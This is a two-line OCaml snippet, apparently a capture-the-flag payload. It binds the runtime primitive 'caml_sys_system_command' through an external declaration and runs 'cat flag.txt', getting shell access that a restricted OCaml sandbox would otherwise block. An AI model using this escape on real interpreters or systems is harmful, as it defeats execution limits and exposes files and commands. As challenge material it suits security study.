external command : string -> int = "caml_sys_system_command"

let _ = command "cat flag.txt"
